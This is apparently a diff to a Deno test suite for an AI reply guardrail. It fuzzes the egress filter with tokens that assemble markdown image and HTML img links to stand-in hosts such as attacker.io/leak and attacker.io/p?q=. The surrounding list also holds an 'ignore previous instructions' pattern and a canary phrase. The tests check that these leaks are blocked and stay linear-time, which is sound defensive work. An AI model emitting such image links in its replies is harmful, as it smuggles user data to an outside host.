@@ -67,6 +67,19 @@ const WORDS = [
   "This turn's canary is",
   'i g n o r e',
   'ignore|previous|instructions',
+  '![',
+  '](',
+  '![x](https://attacker.io/p?q=',
+  'https://attacker.io/leak',
+  'https://example.com/a.png',
+  '<img src=',
+  '"https://cdn.attacker.io/x.png"',
+  '>',
+  '\n[r]: https://attacker.io/r',
+  '[r]',
+  '<a href="https://attacker.io">',
+  ' ![seen](https://attacker.io/leak) ',
+  ' <img src="https://cdn.attacker.io/x.png"> ',
 ];
 const NOISE = [
   ' ',
@@ -218,6 +231,47 @@ Deno.test('the egress stream holds every match from its first character and bloc
   assertEquals(problems, []);
 });
 
+Deno.test('the egress stream holds every leaking image the policy blocks, and only those, given what the model was shown', () => {
+  const images = {
+    seenUrls: new Set(['https://attacker.io/leak']),
+    imageHosts: ['cdn.attacker.io'],
+  };
+  const problems: string[] = [];
+  const outcomes = new Set<string>();
+  const rnd = seeded(31);
+  for (let k = 0; k < 3000; k++) {
+    const text = fuzzText(rnd);
+    const start = referenceMatchStart(text, images);
+    const blocks = collectEgressHits(text, images).length > 0;
+    if (blocks !== start < Number.POSITIVE_INFINITY) {
+      problems.push(`reference disagrees with the policy: ${JSON.stringify(text)}`);
+    }
+    const unscoped = collectEgressHits(text).some(({ rule }) => rule === 'egress.image-exfil');
+    const scoped = collectEgressHits(text, images).some(
+      ({ rule }) => rule === 'egress.image-exfil',
+    );
+    outcomes.add(`${unscoped}/${scoped}`);
+    const stream = createEgressStream({ images });
+    let read = '';
+    for (const chunk of fuzzChunks(text, rnd)) {
+      read += chunk;
+      if (stream.push(chunk)) {
+        if (collectEgressHits(read, images).length === 0) {
+          problems.push(`blocked what the policy passes: ${JSON.stringify(read)}`);
+        }
+        break;
+      }
+      if (stream.holdFrom() > start) {
+        problems.push(`released ${stream.holdFrom() - start} of a match: ${JSON.stringify(text)}`);
+        break;
+      }
+    }
+  }
+  // Leaks the scope clears and leaks it keeps both occur.
+  assertEquals([...outcomes].sort(), ['false/false', 'true/false', 'true/true']);
+  assertEquals(problems, []);
+});
+
 Deno.test('the settled stream views are prefixes of the batch views', () => {
   const rnd = seeded(5);
   const drift: string[] = [];
@@ -252,24 +306,37 @@ Deno.test('the settled stream views are prefixes of the batch views', () => {
   assertEquals(drift, []);
 });
 
-Deno.test('the bundled policy gate reads a reply in time linear in its length', async () => {
-  const context: GuardrailContext = { stage: 'output_delta', trust: 'untrusted', profileId: 'cpu' };
-  const sentence =
-    'The shipment left the warehouse on Tuesday and should arrive within three business days. ';
-  const time = async (length: number): Promise<number> => {
-    const text = sentence.repeat(Math.ceil(length / sentence.length)).slice(0, length);
-    const runs: number[] = [];
-    for (let run = 0; run < 3; run++) {
-      const gate = createProgressiveYieldGate({ context, enforce: standardEgressEnforce });
-      const started = performance.now();
-      for (let at = 0; at < text.length; at += 4) await gate.process(text.slice(at, at + 4));
-      await gate.flush();
-      runs.push(performance.now() - started);
-    }
-    return runs.sort((a, b) => a - b)[1] as number;
-  };
-  await time(5_000);
-  const ratio = (await time(40_000)) / (await time(10_000));
-  // Four times the text: about four times the work, where a rescan of the whole reply is sixteen.
-  assertEquals(ratio < 8 ? 'linear' : `40k/10k took ${ratio.toFixed(1)}x`, 'linear');
-});
+for (const [kind, sentence] of [
+  [
+    'prose',
+    'The shipment left the warehouse on Tuesday and should arrive within three business days. ',
+  ],
+  [
+    'images',
+    '\n[r]: https://example.com/r\n![a][r] ![b](https://example.com/b.png) <b>x</b> <img src=x.png> ',
+  ],
+]) {
+  Deno.test(`the bundled policy gate reads a reply of ${kind} in time linear in its length`, async () => {
+    const context: GuardrailContext = {
+      stage: 'output_delta',
+      trust: 'untrusted',
+      profileId: 'cpu',
+    };
+    const time = async (length: number): Promise<number> => {
+      const text = sentence.repeat(Math.ceil(length / sentence.length)).slice(0, length);
+      const runs: number[] = [];
+      for (let run = 0; run < 3; run++) {
+        const gate = createProgressiveYieldGate({ context, enforce: standardEgressEnforce });
+        const started = performance.now();
+        for (let at = 0; at < text.length; at += 4) await gate.process(text.slice(at, at + 4));
+        await gate.flush();
+        runs.push(performance.now() - started);
+      }
+      return runs.sort((a, b) => a - b)[1] as number;
+    };
+    await time(5_000);
+    const ratio = (await time(40_000)) / (await time(10_000));
+    // Four times the text: about four times the work, where a rescan of the whole reply is sixteen.
+    assertEquals(ratio < 8 ? 'linear' : `40k/10k took ${ratio.toFixed(1)}x`, 'linear');
+  });
+}
